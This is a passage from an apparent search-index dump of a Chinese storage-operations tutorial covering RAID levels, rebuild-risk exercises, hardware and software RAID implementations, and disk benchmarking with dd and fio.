<p>\u200b\u4e5f\u200b\u79f0\u4f5c\u200b\u955c\u50cf\u200b\uff08Mirrored\uff09\uff0c\u200b\u5c06\u200b\u6570\u636e\u200b\u5b8c\u5168\u200b\u590d\u5236\u5230\u200b\u591a\u4e2a\u200b\u78c1\u76d8\u200b\u4e0a\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u7edd\u5bf9\u200b\u5197\u4f59\u200b\uff0c\u200b\u6574\u4e2a\u200b\u9635\u5217\u200b\u4e2d\u200b\u53ea\u200b\u9700\u8981\u200b\u6709\u200b\u4e00\u5757\u200b\u76d8\u200b\u5b58\u6d3b\u200b\uff0c\u200b\u6570\u636e\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u4e22\u5931\u200b\u3002\u200b\u4ee3\u4ef7\u200b\u662f\u200b\u6574\u4e2a\u200b\u9635\u5217\u200b\u7684\u200b\u5bb9\u91cf\u200b\u7b49\u200b\u5355\u5757\u200b\u78c1\u76d8\u200b\u7684\u200b\u5bb9\u91cf\u200b\uff0c\u200b\u7a7a\u95f4\u200b\u5229\u7528\u7387\u200b\u4f4e\u4e0b\u200b\uff0c\u200b\u9002\u5408\u200b\u9700\u8981\u200b\u9ad8\u53ef\u9760\u6027\u200b\u800c\u4e14\u200b\u4e0d\u200b\u7f3a\u94b1\u200b\u7684\u200b\u573a\u666f\u200b\u3002\u200b\u540c\u65f6\u200b\u7531\u4e8e\u200b\u6bcf\u5757\u200b\u76d8\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b\u5b8c\u5168\u4e00\u81f4\u200b\uff0cRAID 1 \u200b\u7684\u200b\u8bfb\u53d6\u200b\u6027\u80fd\u200b\u53ef\u4ee5\u200b\u53e0\u52a0\u200b\uff08\u200b\u751a\u81f3\u200b\u5305\u62ec\u200b\u968f\u673a\u200b\u8bfb\u53d6\u200b\uff09\uff0c\u200b\u4f46\u200b\u5199\u5165\u200b\u6027\u80fd\u200b\u4e0d\u4f1a\u200b\u63d0\u5347\u200b\u3002</p> RAID 5 <p>\u200b\u5c06\u200b\u6570\u636e\u200b\u548c\u200b\u4e00\u4efd\u200b\u6821\u9a8c\u200b\u4fe1\u606f\u200b\u5206\u5757\u200b\u5b58\u50a8\u200b\u5728\u200b\u591a\u4e2a\u200b\u78c1\u76d8\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5141\u8bb8\u200b\u9635\u5217\u200b\u4e2d\u200b\u4efb\u4f55\u200b\u4e00\u5757\u200b\u78c1\u76d8\u200b\u635f\u574f\u200b\uff0c\u200b\u517c\u987e\u200b\u5197\u4f59\u200b\u6027\u200b\u548c\u200b\u5bb9\u91cf\u200b\u5229\u7528\u7387\u200b\u3002\u200b\u91cd\u5efa\u200b\u671f\u95f4\u200b\u7684\u200b\u6027\u80fd\u200b\u4f1a\u200b\u4e25\u91cd\u200b\u4e0b\u964d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e00\u65e6\u200b\u5728\u200b\u91cd\u5efa\u200b\u5b8c\u6210\u200b\u524d\u200b\u53c8\u574f\u4e86\u200b\u4e00\u5757\u200b\u76d8\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u5c31\u200b\u5bc4\u200b\u4e86\u200b\u3002</p> <p>\u200b\u4e0d\u8981\u200b\u4e3a\u200b\u5927\u5bb9\u91cf\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u9635\u5217\u200b\u7ec4\u200b RAID 5</p> <p>\u200b\u5426\u5219\u200b\u574f\u200b\u4e86\u200b\u4e00\u5757\u200b\u76d8\u540e\u200b\u91cd\u5efa\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u7b49\u200b\u6b7b\u200b\u5427\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u7684\u200b\u601d\u8003\u9898\u200b\u4e5f\u200b\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u3002</p> RAID 6 <p>\u200b\u5c06\u200b\u6570\u636e\u200b\u548c\u200b\u4e24\u4efd\u200b\u6821\u9a8c\u200b\u4fe1\u606f\u200b\u5206\u5757\u200b\u5b58\u50a8\u200b\u5728\u200b\u591a\u4e2a\u200b\u78c1\u76d8\u200b\u4e0a\u200b\uff0c\u200b\u6bd4\u200b RAID 5 \u200b\u591a\u200b\u4e86\u200b\u4e00\u4efd\u200b\u6821\u9a8c\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5bb9\u7eb3\u200b\u4e24\u5757\u200b\u78c1\u76d8\u200b\u635f\u574f\u200b\uff0c\u200b\u9002\u5408\u200b\u5927\u5bb9\u91cf\u200b\u6216\u8005\u200b\u78c1\u76d8\u200b\u8f83\u200b\u591a\u200b\u7684\u200b\u9635\u5217\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u5141\u8bb8\u200b\u4e24\u5757\u200b\u76d8\u200b\u635f\u574f\u200b\uff0c\u200b\u4f46\u200b\u6211\u4eec\u200b\u4ecd\u7136\u200b\u5efa\u8bae\u200b\u5728\u200b\u7b2c\u4e00\u5757\u200b\u76d8\u200b\u635f\u574f\u200b\u540e\u200b\u7acb\u5373\u200b\u66f4\u6362\u200b\u5e76\u200b\u91cd\u5efa\u200b\uff0c\u200b\u4e0d\u8981\u200b\u7b49\u5230\u200b\u66f4\u200b\u5371\u9669\u200b\u7684\u200b\u65f6\u5019\u200b\u3002</p> RAID 10, 50, 60 <p>\u200b\u5c06\u200b\u4e0d\u540c\u200b\u7ea7\u522b\u200b\u7684\u200b RAID \u200b\u7ec4\u5408\u200b\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u517c\u987e\u200b\u6027\u80fd\u200b\u548c\u200b\u5197\u4f59\u200b\uff0c\u200b\u5404\u53d6\u6240\u957f\u200b\uff0c\u200b\u5bf9\u4e8e\u200b 10 \u200b\u5757\u200b\u76d8\u200b\u4ee5\u4e0a\u200b\u7684\u200b\u9635\u5217\u200b\u662f\u200b\u66f4\u52a0\u200b\u5e38\u89c1\u200b\u7684\u200b\u9009\u62e9\u200b\u3002\u200b\u4f8b\u5982\u200b RAID 10 = RAID 1 + RAID 0\uff0c\u200b\u901a\u5e38\u200b\u5c06\u200b\u6bcf\u200b\u4e24\u5757\u200b\u76d8\u200b\u7ec4\u6210\u200b RAID 1\uff0c\u200b\u518d\u200b\u5c06\u200b\u8fd9\u4e9b\u200b RAID 1 \u200b\u7684\u200b\u7ec4\u5408\u200b\u62fc\u6210\u200b\u4e00\u4e2a\u200b\u5927\u200b RAID 0\u3002</p> <p>\u200b\u78c1\u76d8\u9635\u5217\u200b\u4e0d\u662f\u200b\u5907\u4efd\u200b</p> <p>RAID \u200b\u4e0d\u662f\u200b\u5907\u4efd\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u5728\u200b\u67d0\u5757\u200b\u78c1\u76d8\u200b\u6545\u969c\u200b\u65f6\u200b\u4fdd\u8bc1\u7cfb\u7edf\u200b\u7ee7\u7eed\u200b\u8fd0\u884c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u5728\u200b\u6570\u636e\u200b\u8bef\u5220\u9664\u200b\u3001\u200b\u81ea\u7136\u707e\u5bb3\u200b\u3001\u200b\u4eba\u4e3a\u200b\u7834\u574f\u200b\u7b49\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u4fdd\u62a4\u200b\u6570\u636e\u200b\u3002</p> <p></p> <p>\u200b\u56fe\u7247\u200b\u6765\u81ea\u200b\u91d1\u67aa\u9c7c\u200b\u4e4b\u591c\u200b\uff1a\u200b\u5b9e\u9a8c\u200b\u7269\u7406\u200b\u5783\u573e\u200b\u4f6c\u200b\u4e4b\u4e50\u200b\u2014\u2014PB \u200b\u7ea7\u200b\u78c1\u76d8\u9635\u5217\u200b\u6f14\u8fdb\u200b</p>"},{"location":"ops/storage/intro/#raid-compare","title":"RAID \u200b\u7b49\u7ea7\u200b\u6bd4\u8f83","text":"\u7b49\u7ea7\u200b \u200b\u5bb9\u91cf\u200b \u200b\u5197\u4f59\u200b \u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b \u200b\u9002\u7528\u200b\u573a\u666f\u200b RAID 0 \u200b\u5168\u90e8\u200b\u53e0\u52a0\u200b \u200b\u65e0\u200b\uff0c\u200b\u6302\u200b\u4e00\u5757\u200b\u76d8\u200b\u5c31\u200b\u5bc4\u200b\u4e86\u200b \u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u9ad8\u200b\uff0c\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u4e00\u822c\u200b\uff08\u200b\u7565\u200b\u597d\u200b\u4e8e\u200b\u5355\u5757\u200b\u76d8\u200b\uff09 \u200b\u4e34\u65f6\u200b\u6570\u636e\u200b\u3001\u200b\u7f13\u5b58\u200b RAID 1 \u200b\u5355\u5757\u200b\u76d8\u200b \u200b\u6700\u9ad8\u200b\uff0c\u200b\u53ea\u8981\u200b\u6709\u200b\u4e00\u5757\u200b\u76d8\u200b\u5b58\u6d3b\u200b\u5c31\u884c\u200b \u200b\u53e0\u52a0\u200b\u7684\u200b\u8bfb\u200b\u6027\u80fd\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ea\u6709\u200b\u5355\u5757\u200b\u76d8\u200b\u7684\u200b\u5199\u200b\u6027\u80fd\u200b \u200b\u91cd\u8981\u200b\u6570\u636e\u200b RAID 5 N-1 \u200b\u5757\u200b\u76d8\u200b \u200b\u53ef\u4ee5\u200b\u574f\u200b\u4e00\u5757\u200b\u76d8\u200b \u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u9ad8\u200b\uff0c\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u5dee\u200b\uff1b\u200b\u91cd\u5efa\u200b\u671f\u95f4\u200b\u5f88\u5dee\u200b \u200b\u517c\u987e\u200b\u5bb9\u91cf\u200b\u548c\u200b\u5b89\u5168\u6027\u200b RAID 6 N-2 \u200b\u5757\u200b\u76d8\u200b \u200b\u53ef\u4ee5\u200b\u574f\u200b\u4e24\u5757\u200b\u76d8\u200b \u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u9ad8\u200b\uff0c\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u5dee\u200b\uff1b\u200b\u91cd\u5efa\u200b\u671f\u95f4\u200b\u66f4\u5dee\u200b \u200b\u6bd4\u200b RAID 5 \u200b\u66f4\u7a33\u200b\u4e00\u70b9\u200b RAID 10 \u200b\u6bcf\u7ec4\u200b RAID 1 \u200b\u5bb9\u91cf\u200b\u53e0\u52a0\u200b \u200b\u6bcf\u7ec4\u200b RAID 1 \u200b\u5185\u200b\u53ea\u200b\u9700\u8981\u200b\u5b58\u6d3b\u200b\u4e00\u5757\u200b\u76d8\u200b \u200b\u987a\u5e8f\u200b\u548c\u200b\u968f\u673a\u6027\u200b\u80fd\u200b\u90fd\u200b\u4e0d\u9519\u200b\uff0c\u200b\u5e76\u4e14\u200b\u91cd\u5efa\u200b\u671f\u95f4\u200b\u8fd8\u200b\u51d1\u5408\u200b \u200b\u517c\u987e\u200b\u6027\u80fd\u200b\u548c\u200b\u5b89\u5168\u6027\u200b RAID 60 \uff08\u200b\u81ea\u884c\u200b\u8ba1\u7b97\u200b\uff09 \u200b\u6bcf\u7ec4\u200b RAID 6 \u200b\u5185\u200b\u53ef\u4ee5\u200b\u574f\u200b\u4e24\u5757\u200b\u76d8\u200b \u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u4e0d\u9519\u200b\uff0c\u200b\u5e76\u4e14\u200b\u91cd\u5efa\u200b\u671f\u95f4\u200b\u66f4\u200b\u51d1\u5408\u200b\u4e86\u200b \u200b\u76d8\u200b\u5f88\u591a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u517c\u987e\u200b\u5bb9\u91cf\u200b\u548c\u200b\u5b89\u5168\u6027\u200b <p>RAID 4 \u200b\u548c\u200b RAID 50 \u200b\u5728\u200b\u8fd9\u91cc\u200b\u4e0d\u200b\u4f5c\u200b\u8ba8\u8bba\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u6ca1\u4eba\u7528\u200b\u3002</p> <p>\u200b\u601d\u8003\u9898\u200b</p> <ol> <li>\u200b\u4e3a\u4ec0\u4e48\u200b RAID 5 \u200b\u548c\u200b RAID 6 \u200b\u7684\u200b\u91cd\u5efa\u200b\u671f\u95f4\u200b\u6027\u80fd\u200b\u4f1a\u200b\u5f88\u200b\u5dee\u200b\uff1f</li> <li>\u200b\u4e3a\u4ec0\u4e48\u200b\u5c06\u200b\u5927\u91cf\u200b\u7684\u200b\u78c1\u76d8\u200b\u7ec4\u5408\u6210\u200b\u5355\u4e2a\u200b RAID 6 \u200b\u4e0d\u662f\u200b\u4e00\u4e2a\u200b\u597d\u200b\u4e3b\u610f\u200b\uff1f\u200b\u4e3a\u4ec0\u4e48\u200b RAID 50 \u200b\u6ca1\u4eba\u7528\u200b\uff1f</li> <li>\u200b\u4e3a\u4ec0\u4e48\u200b\u8bf4\u200b RAID 5/6 \u200b\u6709\u200b\u5f88\u200b\u9ad8\u200b\u7684\u200b\u5199\u200b\u60e9\u7f5a\u200b\uff08Write penalty\uff09\uff1f</li> <li> <p>\u200b\u5728\u200b\u8be5\u200b\u5e16\u5b50\u200b\u4e2d\u200b\uff0c\u200b\u53d1\u5e16\u4eba\u200b\u8bf4\u200b\u81ea\u5df1\u200b\u7ec4\u4e86\u200b 14TB * 12 \u200b\u7684\u200b RAID 5\u3002     \u200b\u5047\u8bbe\u200b\u8fd9\u200b 12 \u200b\u5757\u200b\u76d8\u200b\u662f\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\uff0c\u200b\u4e0d\u53ef\u200b\u6062\u590d\u200b\u8bfb\u200b\u9519\u8bef\u7387\u200b\u4e3a\u200b 10^-14\uff0c\u200b\u5982\u679c\u200b\u4ec5\u200b\u8003\u8651\u200b URE\uff0c\u200b\u90a3\u4e48\u200b\u5f53\u200b\u635f\u574f\u200b\u4e86\u200b\u4e00\u5757\u200b\u76d8\u200b\u91cd\u5efa\u200b\u65f6\u200b\uff0c\u200b\u91cd\u5efa\u200b\u6210\u529f\u200b\uff08\u200b\u65e0\u200b\u6570\u636e\u200b\u635f\u574f\u200b\uff09\u200b\u7684\u200b\u6982\u7387\u200b\u662f\u200b\u591a\u5c11\u200b\uff1f\u200b\u5982\u679c\u200b\u4e0d\u53ef\u200b\u6062\u590d\u200b\u8bfb\u200b\u9519\u8bef\u7387\u200b\u4e3a\u200b 10^-15 \u200b\u5462\u200b\uff1f</p> <p>\u200b\u63d0\u793a\u200b\uff1a\u200b\u5047\u8bbe\u200b\u4e3a\u200b\u4e8c\u9879\u5206\u5e03\u200b\uff0c\u200b\u524d\u8005\u200b\u7ed3\u679c\u200b\u63a5\u8fd1\u200b\u4e8e\u200b 0\uff08\u200b\u51e0\u4e4e\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u6210\u529f\u200b\uff09\uff0c\u200b\u540e\u8005\u200b\u7ed3\u679c\u200b\u63a5\u8fd1\u200b\u4e8e\u200b 0.25\uff08\u200b\u51f6\u591a\u5409\u5c11\u200b\uff09\u3002</p> </li> <li> <p>\u200b\u5bf9\u200b\u95ee\u9898\u200b 4\uff0c\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b AFR \u200b\u800c\u200b\u4e0d\u662f\u200b URE \u200b\u8ba1\u7b97\u200b\u4f1a\u200b\u5982\u4f55\u200b\u5462\u200b\uff1f\u200b\u5047\u8bbe\u200b MTBF \u200b\u4e3a\u200b 10 \u200b\u4e07\u200b\u5c0f\u65f6\u200b\uff0c\u200b\u987a\u5e8f\u200b\u8bfb\u200b\u6700\u5927\u200b\u5e26\u5bbd\u200b\u4e3a\u200b 100 MB/s\uff0c\u200b\u5b9e\u73b0\u200b\u4f7f\u7528\u200b 30% \u200b\u7684\u200b\u5e26\u5bbd\u200b\uff08\u200b\u4e0d\u80fd\u200b\u4e25\u91cd\u200b\u5f71\u54cd\u200b\u5df2\u6709\u200b\u7684\u200b\u4e1a\u52a1\u200b\uff09\uff0c\u200b\u5141\u8bb8\u200b URE \u200b\u5bfc\u81f4\u200b\u7684\u200b\u53ef\u80fd\u200b\u7684\u200b\u90e8\u5206\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u3002</p> <p>\u200b\u63d0\u793a\u200b\uff1a\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5931\u8d25\u7387\u200b\u4f1a\u200b\u5927\u5e45\u200b\u964d\u4f4e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ecd\u7136\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b RAID 5\u2014\u2014\u200b\u4e0d\u8981\u200b\u548c\u200b\u91cd\u8981\u200b\u7684\u200b\u6570\u636e\u200b\u73a9\u200b\u8fd9\u79cd\u200b\u6982\u7387\u200b\u6e38\u620f\u200b\u3002</p> </li> <li> <p>\u200b\u9664\u4e86\u200b\u4ee5\u4e0a\u200b\u4ecb\u7ecd\u200b\u7684\u200b RAID 10\uff0c\u200b\u8fd8\u6709\u200b RAID 01\u3002\u200b\u67e5\u8be2\u200b\u8d44\u6599\u200b\uff0c\u200b\u7b80\u5355\u200b\u4ecb\u7ecd\u200b\u5b83\u4eec\u200b\u7684\u200b\u533a\u522b\u200b\u3002RAID 01 \u200b\u5b58\u5728\u200b\u4ec0\u4e48\u200b\u95ee\u9898\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u5b83\u200b\u4e0d\u200b\u5e38\u7528\u200b\uff08\u200b\u6211\u4eec\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b\uff09\uff1f</p> </li> </ol>"},{"location":"ops/storage/intro/#raid-implementation","title":"RAID \u200b\u5b9e\u73b0\u200b\u65b9\u5f0f","text":"<p>RAID \u200b\u53ef\u4ee5\u200b\u5728\u200b\u786c\u4ef6\u200b\u5c42\u9762\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5c42\u9762\u200b\u901a\u8fc7\u200b\u8f6f\u4ef6\u200b\u5b9e\u73b0\u200b\u3002</p> <p>\u200b\u786c\u4ef6\u200b\uff1a</p> <ul> <li>LSI MegaRAID \u200b\u7cfb\u5217\u200b\u662f\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u786c\u4ef6\u200b RAID \u200b\u5361\u200b</li> <li>HPE Smart Array \u200b\u7cfb\u5217\u200b</li> <li>\u200b\u4e00\u4e9b\u200b\u4e13\u7528\u200b\u7684\u200b\u5b58\u50a8\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u5982\u200b HPE MSA\u3001Dell EMC PowerVault \u200b\u7b49\u200b\u5b58\u50a8\u200b\u7f51\u7edc\u200b\uff08SAN\uff09\u200b\u8bbe\u5907\u200b</li> <li>Intel RST \u200b\u548c\u200b Intel VMD\uff0c\u200b\u662f\u200b\u4e2a\u4eba\u200b\u8ba1\u7b97\u673a\u200b\u4e0a\u200b\u5e38\u89c1\u200b\u7684\u200b\u786c\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\uff08\u200b\u4f46\u662f\u200b\u975e\u5e38\u200b\u96be\u200b\u7528\u200b\uff09</li> </ul> <p>Windows\uff1a</p> <ul> <li>\u200b\u8f83\u200b\u65e9\u200b\u7684\u200b\u201c\u200b\u52a8\u6001\u200b\u78c1\u76d8\u200b\u201d\u200b\u529f\u80fd\u200b\u652f\u6301\u200b RAID 0\u30011\u30015 \u200b\u7b49\u200b\u7ea7\u522b\u200b\uff0c\u200b\u5e76\u4e14\u200b\u662f\u200b\u5728\u200b\u5206\u533a\u200b\u5c42\u9762\u200b\u5b9e\u73b0\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u540c\u4e00\u4e2a\u200b\u786c\u76d8\u200b\u7ec4\u4e0a\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u591a\u4e2a\u200b\u91c7\u7528\u200b\u4e0d\u540c\u200b RAID \u200b\u7ea7\u522b\u200b\u7684\u200b\u5377\u200b\uff08\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff09</li> <li>\u200b\u8f83\u200b\u65b0\u200b\u7684\u200b Windows \u200b\u5f00\u59cb\u200b\u652f\u6301\u200b Storage Spaces\uff0c\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u591a\u200b RAID \u200b\u7ea7\u522b\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u201c\u200b\u955c\u50cf\u200b\u52a0\u901f\u200b\u201d\u3001\u201c\u200b\u81ea\u52a8\u200b\u70ed\u200b\u8fc1\u79fb\u200b\u201d\u200b\u7b49\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f46\u662f\u200b\u6bd4\u200b\u52a8\u6001\u200b\u78c1\u76d8\u200b\u66f4\u52a0\u200b\u96be\u200b\u7528\u200b\uff0c\u200b\u91cd\u5efa\u200b\u4e5f\u200b\u66f4\u200b\u590d\u6742\u200b</li> </ul> <p>Linux\uff1a</p> <ul> <li>mdadm \u200b\u662f\u200b Linux \u200b\u4e0a\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u8f6f\u4ef6\u200b RAID \u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u4e4b\u4e00\u200b</li> <li>Linux \u200b\u5e38\u7528\u200b\u7684\u200b\u903b\u8f91\u200b\u5377\u200b\u7ba1\u7406\u5de5\u5177\u200b LVM \u200b\u4e5f\u200b\u652f\u6301\u200b RAID \u200b\u529f\u80fd\u200b</li> <li>\u200b\u4e00\u90e8\u5206\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u5982\u200b ZFS \u200b\u548c\u200b Btrfs\uff0c\u200b\u4e5f\u200b\u652f\u6301\u200b RAID \u200b\u529f\u80fd\u200b</li> </ul> <p>\u200b\u670d\u52a1\u5668\u200b\u4e00\u822c\u200b\u90fd\u200b\u914d\u5907\u200b\u4e86\u200b\u786c\u4ef6\u200b RAID \u200b\u5361\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u8f6f\u4ef6\u200b RAID\uff0c\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b RAID \u200b\u5361\u200b\u6216\u200b\u5bf9\u5e94\u200b\u78c1\u76d8\u200b\u5230\u200b HBA \u200b\u6a21\u5f0f\u200b\uff08\u200b\u4e5f\u200b\u53eb\u200b JBOD/Non-RAID/\u200b\u76f4\u901a\u200b \u200b\u6a21\u5f0f\u200b\uff09\u3002 \u200b\u4e00\u90e8\u5206\u200b\u4f4e\u7aef\u200b RAID \u200b\u5361\u200b\u4e0d\u200b\u63d0\u4f9b\u200b\u76f8\u5173\u200b\u529f\u80fd\u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u5c3d\u7ba1\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4e3a\u200b\u6bcf\u5757\u200b\u78c1\u76d8\u200b\u521b\u5efa\u200b\u5355\u72ec\u200b\u7684\u200b RAID 0 \u200b\u9635\u5217\u200b\u5b9e\u73b0\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f46\u662f\u200b\u5e76\u200b\u4e0d\u200b\u63a8\u8350\u200b\u3002</p>"},{"location":"ops/storage/intro/#benchmark","title":"\u6027\u80fd\u200b\u6d4b\u8bd5","text":"<p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>fio</code> \u200b\u6d4b\u8bd5\u200b\u78c1\u76d8\u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u5176\u200b\u652f\u6301\u200b\u5728\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6216\u8005\u200b\u5757\u200b\u8bbe\u5907\u200b\u4e0a\u200b\u4f7f\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b I/O \u200b\u8bbf\u95ee\u200b\u6a21\u5f0f\u200b\u8fdb\u884c\u200b\u6d4b\u8bd5\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b dd \u200b\u6d4b\u901f\u200b\u7684\u200b\u4e0d\u8db3\u200b</p> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4f7f\u7528\u200b dd \u200b\u547d\u4ee4\u200b\u6d4b\u8bd5\u200b\u4e00\u5757\u200b\u5e0c\u6377\u200b 4TB \u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> \u200b\u5199\u5165\u200b\u6d4b\u8bd5\u200b<pre><code>$ dd if=/dev/zero of=test.img bs=1M count=1000 oflag=direct\n1000+0 records in\n1000+0 records out\n1048576000 bytes (1.0 GB, 1000 MiB) copied, 11.3336 s, 92.5 MB/s\n</code></pre> \u200b\u8bfb\u53d6\u200b\u6d4b\u8bd5\u200b<pre><code>$ dd if=/dev/sda1 of=/dev/null bs=1M count=1000 iflag=direct\n1000+0 records in\n1000+0 records out\n1048576000 bytes (1.0 GB, 1000 MiB) copied, 6.68942 s, 157 MB/s\n</code></pre> <p>\u200b\u867d\u7136\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b dd \u200b\u547d\u4ee4\u200b\u7b80\u6613\u200b\u5730\u200b\u6d4b\u901f\u200b\uff0c\u200b\u4f46\u662f\u200b dd \u200b\u547d\u4ee4\u200b\u6709\u200b\u4e00\u4e9b\u200b\u7f3a\u70b9\u200b\uff1a</p> <ul> <li>dd \u200b\u53ea\u80fd\u200b\u6d4b\u8bd5\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u6d4b\u8bd5\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u3002</li> <li>dd \u200b\u4f7f\u7528\u200b\u975e\u5e38\u4f4e\u200b\u7684\u200b I/O \u200b\u961f\u5217\u200b\u6df1\u5ea6\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u5145\u5206\u200b\u6d4b\u8bd5\u200b\u8bbe\u5907\u200b\u7684\u200b\u5e76\u53d1\u200b\u6027\u80fd\u200b\uff0c\u200b\u8fd9\u200b\u5bf9\u4e8e\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u5c24\u4e3a\u200b\u660e\u663e\u200b\u3002</li> <li>dd \u200b\u547d\u4ee4\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u7684\u200b\u7279\u6b8a\u200b\u8bbe\u5907\u200b <code>/dev/urandom</code>\u3001<code>/dev/random</code> \u200b\u672c\u8eab\u200b\u6027\u80fd\u200b\u6709\u9650\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6210\u4e3a\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u74f6\u9888\u200b\u3002\uff08\u200b\u6bd4\u5982\u200b\u6d4b\u8bd5\u200b <code>dd if=/dev/random of=/dev/null bs=1M count=1000</code> \u200b\u53ef\u80fd\u200b\u53ea\u6709\u200b 500MB/s \u200b\u7684\u200b\u901f\u5ea6\u200b\uff09</li> </ul> <p>\u200b\u56e0\u6b64\u200b\u8981\u200b\u5bf9\u200b\u78c1\u76d8\u200b\u8fdb\u884c\u200b\u66f4\u52a0\u200b\u5168\u9762\u200b\u7684\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b fio \u200b\u8fd9\u200b\u6b3e\u200b\u66f4\u52a0\u200b\u4e13\u4e1a\u200b\u7684\u200b\u5de5\u5177\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b fio \u200b\u8fdb\u884c\u200b\u6d4b\u8bd5\u200b\u9700\u8981\u200b\u786e\u5b9a\u200b\u4ee5\u4e0b\u200b\u57fa\u7840\u200b\u53c2\u6570\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u53c2\u6570\u200b\u63cf\u8ff0\u200b\u4e86\u200b I/O \u200b\u8d1f\u8f7d\u200b\u662f\u200b\u4ec0\u4e48\u6837\u200b\u7684\u200b\uff1a</p> <ul> <li><code>--rw</code>\uff1aI/O \u200b\u8bbf\u95ee\u200b\u7684\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>read</code>, <code>write</code>\uff08\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\uff09, <code>randread</code>, <code>randwrite</code>\uff08\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\uff09, <code>randrw</code>\uff08\u200b\u968f\u673a\u200b\u6df7\u5408\u200b\u8bfb\u5199\u200b\uff09\u200b\u7b49\u200b\u3002</li> <li><code>--bs</code>\uff1a\u200b\u6bcf\u6b21\u200b I/O \u200b\u64cd\u4f5c\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b 4KB\u3002bs 